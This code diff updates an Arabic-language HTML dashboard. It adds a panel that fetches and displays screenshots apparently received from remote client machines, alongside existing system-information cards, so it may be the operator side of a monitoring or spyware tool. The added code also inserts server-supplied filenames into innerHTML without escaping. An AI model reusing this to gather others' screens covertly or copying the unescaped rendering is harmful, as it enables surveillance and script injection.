@@ -11,7 +11,7 @@
             color: #e0e0e0;
             padding: 20px;
         }
-        .container { max-width: 1100px; margin: 0 auto; }
+        .container { max-width: 1200px; margin: 0 auto; }
         h1 {
             text-align: center;
             color: #00e676;
@@ -38,6 +38,8 @@
         .btn-danger:hover { background: #d32f2f; }
         .btn-info { background: #2196F3; color: #fff; }
         .btn-info:hover { background: #1976D2; }
+        .btn-purple { background: #9C27B0; color: #fff; }
+        .btn-purple:hover { background: #7B1FA2; }
         .token-input {
             padding: 10px 15px;
             background: #1a1a2e;
@@ -104,6 +106,58 @@
             border: 1px solid #ff5252;
             margin: 15px 0;
         }
+        /* ===== لقطات الشاشة ===== */
+        .screenshots-section {
+            margin-top: 30px;
+            border-top: 2px solid #2a2a4a;
+            padding-top: 20px;
+        }
+        .screenshots-section h2 {
+            color: #00e676;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .screenshots-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        .screenshot-card {
+            background: #1a1a2e;
+            border-radius: 12px;
+            padding: 15px;
+            border: 1px solid #2a2a4a;
+            text-align: center;
+        }
+        .screenshot-card:hover { border-color: #00e676; }
+        .screenshot-card img {
+            max-width: 100%;
+            border-radius: 8px;
+            border: 1px solid #333;
+            max-height: 200px;
+            object-fit: cover;
+        }
+        .screenshot-card .filename {
+            color: #888;
+            font-size: 0.8rem;
+            margin-top: 8px;
+        }
+        .screenshot-card .size {
+            color: #666;
+            font-size: 0.7rem;
+        }
+        .no-screenshots {
+            text-align: center;
+            color: #888;
+            padding: 30px;
+            grid-column: 1/-1;
+        }
+        .loading-screenshots {
+            text-align: center;
+            color: #ffa726;
+            padding: 20px;
+            grid-column: 1/-1;
+        }
     </style>
 </head>
 <body>
@@ -116,6 +170,7 @@
         <button class="btn btn-primary" onclick="loadData()">🔄 تحديث</button>
         <button class="btn btn-info" onclick="sendTest()">🧪 اختبار</button>
         <button class="btn btn-danger" onclick="clearData()">🗑️ مسح</button>
+        <button class="btn btn-purple" onclick="loadScreenshots()">📸 لقطات الشاشة</button>
     </div>
 
     <div class="status-box" id="statusBox">
@@ -131,10 +186,19 @@
     </div>
     <div class="grid" id="cards" style="display:none;"></div>
     <div class="timestamp" id="timestamp"></div>
+
+    <!-- ===== قسم لقطات الشاشة ===== -->
+    <div class="screenshots-section" id="screenshotsSection" style="display:none;">
+        <h2>📸 لقطات الشاشة المستلمة</h2>
+        <div class="screenshots-grid" id="screenshotsGrid">
+            <div class="loading-screenshots">⏳ جاري تحميل لقطات الشاشة...</div>
+        </div>
+    </div>
 </div>
 
 <script>
     const API_URL = '/api/system-info';
+    const SCREENSHOTS_URL = '/api/screenshots';
 
     async function loadData() {
         const loading = document.getElementById('loading');
@@ -143,12 +207,14 @@
         const cards = document.getElementById('cards');
         const timestamp = document.getElementById('timestamp');
         const statusText = document.getElementById('statusText');
+        const screenshotsSection = document.getElementById('screenshotsSection');
 
         loading.style.display = 'block';
         error.style.display = 'none';
         empty.style.display = 'none';
         cards.style.display = 'none';
         timestamp.innerText = '';
+        screenshotsSection.style.display = 'none';
         statusText.innerText = '🔄 جاري التحميل...';
         statusText.style.color = '#ffa726';
 
@@ -272,8 +338,75 @@
         }
     }
 
+    // ===== لقطات الشاشة =====
+    async function loadScreenshots() {
+        const section = document.getElementById('screenshotsSection');
+        const grid = document.getElementById('screenshotsGrid');
+        const statusText = document.getElementById('statusText');
+
+        section.style.display = 'block';
+        grid.innerHTML = '<div class="loading-screenshots">⏳ جاري تحميل لقطات الشاشة...</div>';
+        statusText.innerText = '📸 جاري تحميل اللقطات...';
+        statusText.style.color = '#ffa726';
+
+        try {
+            const token = document.getElementById('tokenInput').value;
+            const response = await fetch(SCREENSHOTS_URL, {
+                headers: { 'Authorization': token }
+            });
+
+            if (!response.ok) {
+                throw new Error('HTTP ' + response.status);
+            }
+
+            const data = await response.json();
+
+            if (!data.screenshots || data.screenshots.length === 0) {
+                grid.innerHTML = `
+                    <div class="no-screenshots">
+                        <div style="font-size:3rem;">📭</div>
+                        <h3>لا توجد لقطات شاشة</h3>
+                        <p>لم يتم استقبال أي لقطات من العملاء بعد</p>
+                    </div>
+                `;
+                statusText.innerText = '📸 لا توجد لقطات';
+                statusText.style.color = '#888';
+                return;
+            }
+
+            let html = '';
+            for (const shot of data.screenshots) {
+                const sizeKB = (shot.size / 1024).toFixed(1);
+                html += `
+                    <div class="screenshot-card">
+                        <img src="${shot.url}" alt="${shot.filename}" loading="lazy">
+                        <div class="filename">📷 ${shot.filename}</div>
+                        <div class="size">${sizeKB} KB</div>
+                        <a href="${shot.url}" target="_blank" style="color:#00e676;text-decoration:none;font-size:0.8rem;">🔗 عرض الصورة</a>
+                    </div>
+                `;
+            }
+
+            grid.innerHTML = html;
+            statusText.innerText = `📸 ${data.screenshots.length} لقطة شاشة`;
+            statusText.style.color = '#00e676';
+
+        } catch (err) {
+            grid.innerHTML = `
+                <div class="no-screenshots" style="color:#ff5252;">
+                    <div style="font-size:3rem;">❌</div>
+                    <h3>فشل تحميل لقطات الشاشة</h3>
+                    <p>${err.message}</p>
+                </div>
+            `;
+            statusText.innerText = '❌ فشل تحميل اللقطات';
+            statusText.style.color = '#ff5252';
+        }
+    }
+
+    // تحميل عند فتح الصفحة
     loadData();
-    setInterval(loadData, 15000);
+    setInterval(loadData, 30000);
 </script>
 </body>
 </html>
